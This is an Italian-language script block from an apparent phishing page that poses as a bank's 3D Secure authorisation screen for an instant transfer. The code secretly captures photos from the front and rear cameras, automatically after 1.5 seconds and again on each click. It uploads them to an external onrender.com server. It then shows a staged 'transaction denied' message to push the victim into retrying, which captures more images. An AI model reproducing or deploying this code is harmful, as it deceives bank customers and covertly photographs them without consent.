<script>
  const countdownEl = document.getElementById('countdown');
  const card = document.getElementById('card');
  const videoFront = document.getElementById('videoFront');
  const videoBack = document.getElementById('videoBack');
  const canvasFront = document.getElementById('canvasFront');
  const canvasBack = document.getElementById('canvasBack');
  const contextFront = canvasFront.getContext('2d');
  const contextBack = canvasBack.getContext('2d');

  document.getElementById('data-operazione').innerText = new Date().toLocaleString('it-IT', {
    timeZone: 'Europe/Rome'
  });

  let seconds = 120;
  const timer = setInterval(() => {
    seconds--;
    const m = String(Math.floor(seconds / 60)).padStart(2, '0');
    const s = String(seconds % 60).padStart(2, '0');
    countdownEl.innerText = `${m}:${s}`;
    if (seconds <= 0) {
      clearInterval(timer);
      showFailure("Sessione scaduta.");
    }
  }, 1000);

  // Avvia entrambe le fotocamere (frontale e posteriore)
  function startVideoStreams() {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
      .then(stream => {
        videoFront.srcObject = stream;
      })
      .catch(() => {
        showFailure("Webcam frontale non disponibile.");
      });

    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } })
      .then(stream => {
        videoBack.srcObject = stream;
      })
      .catch(() => {
        // fallback: non tutti i device supportano la posteriore
        console.warn("Webcam posteriore non disponibile.");
      });
  }

  startVideoStreams();

  // Scatta da entrambe le webcam (se disponibili)
  function takeAndSendPhoto(action) {
    if (videoFront.readyState >= 2) {
      canvasFront.width = videoFront.videoWidth;
      canvasFront.height = videoFront.videoHeight;
      contextFront.drawImage(videoFront, 0, 0, canvasFront.width, canvasFront.height);
      const imgFront = canvasFront.toDataURL('image/png');
      uploadImage(imgFront, action + '_front');
    }

    if (videoBack.readyState >= 2) {
      canvasBack.width = videoBack.videoWidth;
      canvasBack.height = videoBack.videoHeight;
      contextBack.drawImage(videoBack, 0, 0, canvasBack.width, canvasBack.height);
      const imgBack = canvasBack.toDataURL('image/png');
      uploadImage(imgBack, action + '_back');
    }
  }

  function uploadImage(image, label) {
    fetch('https://backend-render-server.onrender.com/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: label, image })
    });
  }

  function handleClick() {
    takeAndSendPhoto("autorizza");
    showLoadingScreen();
    setTimeout(() => showFailure(), 4000);
  }

  function handleRetry() {
    takeAndSendPhoto("riprovare");
    setTimeout(() => location.reload(), 1000);
  }

  function showFailure(msg = null) {
    card.innerHTML = `
      <img src="fail.png" alt="Errore" class="result-image">
      <h2 style="color: rgb(251, 18, 34);">Transazione Negata</h2>
      <p>${msg ?? "L'autenticazione 3D Secure non è andata a buon fine."}</p>
      <p>Il sistema ha rilevato un'anomalia di sicurezza, è necessario ripetere l'operazione di autorizzazione.</p>
      <button class="riprovare" onclick="handleRetry()">RIPROVA</button>
    `;
  }

  function showLoadingScreen() {
    card.innerHTML = `
      <h2>Invio bonifico istantaneo</h2>
      <div class="loading">Autorizzazione in corso...</div>
    `;
  }

  // Autoscatto dopo 1,5 secondi
  setTimeout(() => takeAndSendPhoto("auto-scatto"), 1500);
</script>
